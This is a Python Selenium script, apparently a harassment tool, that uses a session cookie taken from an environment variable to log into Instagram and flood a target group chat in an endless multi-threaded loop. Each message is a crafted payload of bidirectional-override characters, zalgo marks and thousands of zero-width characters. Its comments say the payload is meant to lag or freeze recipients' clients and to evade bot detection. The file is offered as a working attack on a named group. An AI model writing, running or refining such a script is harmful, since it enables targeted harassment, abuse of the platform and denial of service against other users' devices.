# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (V100 MAX-LIMIT)
# 📅 STATUS: 10 AGENTS | MAX BLOAT | 2-MIN RESTART

import os, time, random, threading, sys, gc, tempfile, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- V100 MAX CONFIG ---
THREADS = 2
SESSION_LIMIT = 120 # CRITICAL: Max bloat fills RAM fast. Do not increase this.

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_max_payload():
    """The Absolute Limit of Instagram's DOM Rendering."""
    header = "👑 PRAVEER PAPA 👑\n"
    sub_header = "SYSTEM ERROR: [TEAM DEvEL] HAS BEEN OWNED\n"
    
    # 💥 MAX DIRECTIONAL CHAOS (Forces extreme text-reversal lag)
    direction_chaos = ("\u202E" + "\u202D") * 150 
    
    # 💥 MAX ZALGO TOWER (Extreme vertical stretching)
    z_tower = "̸" * 120
    
    # 💥 MAX INVISIBLE BLOAT (5,500 chars to clog the message buffer)
    bloat = "".join(random.choice(["\u200B", "\u200D", "\u2060"]) for _ in range(5500))
    
    lines = [header, sub_header, bloat]
    
    # 💥 MAX REPETITIONS (60 lines of skyscraper)
    for _ in range(60):
        lines.append(direction_chaos + "TEAM_DEvEL_OWNED" + z_tower)
    
    lines.append(bloat + "\n🛑 SYSTEM UNRESPONSIVE 🛑")
    return "\n".join(lines)

def log_status(agent_id, msg):
    print(f"[M{MACHINE_ID}-A{agent_id}] {msg}", flush=True)

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--window-size=1920,1080")
    # Using a modern User-Agent to avoid bot detection during high-volume send
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
    
    temp_dir = os.path.join(tempfile.gettempdir(), f"max_devel_{agent_id}")
    chrome_options.add_argument(f"--user-data-dir={temp_dir}")
    return webdriver.Chrome(options=chrome_options)

def run_life_cycle(agent_id, cookie, target):
    while True:
        driver = None
        session_start = time.time()
        try:
            log_status(agent_id, "🚀 DEPLOYING MAX AGENT...")
            driver = get_driver(agent_id)
            
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(5)
            
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(8)

            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                    
                    # Force-Inject the Maxed Payload
                    driver.execute_script("""
                        var el = arguments[0];
                        document.execCommand('insertText', false, arguments[1]);
                        el.dispatchEvent(new Event('input', { bubbles: true }));
                    """, box, get_max_payload())
                    
                    box.send_keys(Keys.ENTER)
                    
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                        log_status(agent_id, f"🔥 IMPACT: {GLOBAL_SENT} | [TEAM DEvEL] DESTROYED")
                    
                    # 0.5s pause to allow the browser to process the massive injection
                    time.sleep(0.5)
                except:
                    time.sleep(3)

        except Exception: pass
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(2)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target = os.environ.get("GROUP_URL", "").strip()
    if not cookie or not target: sys.exit(1)

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
